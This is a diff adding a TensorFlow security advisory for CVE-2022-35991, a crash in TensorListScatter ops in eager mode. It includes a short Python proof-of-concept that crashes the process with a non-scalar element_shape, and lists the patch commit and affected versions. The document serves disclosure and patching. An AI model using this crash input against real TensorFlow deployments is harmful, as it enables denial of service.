@@ -1,0 +1,20 @@
+<h2>TFSA-2022-170: <code>CHECK</code> fail in <code>TensorListScatter</code> and <code>TensorListScatterV2</code> in eager mode</h2>
+<h3>CVE Number</h3>
+<p>CVE-2022-35991</p>
+<h3>Impact</h3>
+<p>Another instance of CVE-2022-35991, where <code>TensorListScatter</code> and <code>TensorListScatterV2</code> crash via non scalar inputs in<code>element_shape</code>, was found in eager mode and fixed.
+<code>python
+import tensorflow as tf
+arg_0=tf.random.uniform(shape=(2, 2, 2), dtype=tf.float16, maxval=None)
+arg_1=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)
+arg_2=tf.random.uniform(shape=(2, 2, 2), dtype=tf.int32, maxval=65536)
+arg_3=''
+tf.raw_ops.TensorListScatter(tensor=arg_0, indices=arg_1, 
+element_shape=arg_2, name=arg_3)</code></p>
+<h3>Patches</h3>
+<p>We have patched the issue in GitHub commit <a href="https://github.com/tensorflow/tensorflow/commit/bf9932fc907aff0e9e8cccf769e8b00d30fd81a1">bf9932fc907aff0e9e8cccf769e8b00d30fd81a1</a>.</p>
+<p>The fix will be included in TensorFlow 2.11. We will also cherrypick this commit on TensorFlow 2.10.1, 2.9.3, and TensorFlow 2.8.4, as these are also affected and still in supported range.</p>
+<h3>For more information</h3>
+<p>Please consult <a href="https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>
+<h3>Attribution</h3>
+<p>This vulnerability has been reported by Pattarakrit Rattankul</p>
